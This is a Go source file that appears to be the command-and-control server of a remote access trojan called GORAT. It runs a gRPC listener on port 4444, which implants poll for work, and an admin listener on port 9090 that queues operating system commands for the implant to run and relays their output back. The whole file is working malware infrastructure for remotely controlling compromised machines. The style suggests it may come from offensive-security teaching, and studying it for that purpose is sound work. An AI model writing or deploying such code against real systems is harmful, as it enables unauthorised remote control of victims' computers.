package main

import (
	"context"
	"errors"
	"fmt"
	"github.com/vpaklatzis/GORAT/grpcapi"
	"google.golang.org/grpc"
	"log"
	"net"
)

// contains two channels used for sending and
// receiving work and command output
type implantServer struct {
	work, output chan *grpcapi.Command
}

// contains two channels used for sending and
// receiving work and command output
type adminServer struct {
	work, output chan *grpcapi.Command
}

// create new implantServer instance and initialize channels
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer {
	s := new(implantServer)
	s.work = work
	s.output = output
	return s
}

// create new adminServer instance and initialize channels
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer {
	s := new(adminServer)
	s.work = work
	s.output = output
	return s
}

// receives a *grpcapi.Empty and returns a *grpcapi.Command
// implant calls FetchCommand on a periodic basis as a way to get work on a
// near-real-time schedule
func (s *implantServer) FetchCommand(ctx context.Context, empty *grpcapi.Empty) (*grpcapi.Command, error) {
	var cmd = new(grpcapi.Command)
	select {
	case cmd, ok := <-s.work:
		if ok {
			return cmd, nil
		}
		return cmd, errors.New("channel closed")
	default:
		return cmd, nil
	}
}

// pushes the received *grpcapi.Command onto the output channel
// SendOutput takes the result from implant and puts it onto a channel
// that our admin component will read from later
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

// represents a unit of work our admin component wants our implant to execute
// returns the result of the operating system command executed by the implant
func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command
	go func() {
		s.work <- cmd
	}()
	res = <-s.output
	return res, nil
}

// main runs two separate servers—one to receive commands
// from the admin client and the other to receive polling from the implant
func main() {
	var (
		implantListener, adminListener net.Listener
		err                            error
		opts                           []grpc.ServerOption
		work, output                   chan *grpcapi.Command
	)
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output)
	if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 4444)); err != nil {
		log.Fatal("Implant listener failed to bind to port 4444: ", err)
	}
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		log.Fatal("Admin listener failed to bind to port 9090: ", err)
	}
	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
	grpcapi.RegisterImplantServer(grpcImplantServer, implant)
	log.Println("Starting gRPC implant server listener on port 4444...")
	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	log.Println("Starting gRPC admin server listener on port 9090...")
	go func() {
		if err := grpcImplantServer.Serve(implantListener); err != nil {
			log.Fatal("Implant server failed to serve: ", err)
		}
	}()
	if err := grpcAdminServer.Serve(adminListener); err != nil {
		log.Fatal("Admin server failed to serve: ", err)
	}
}
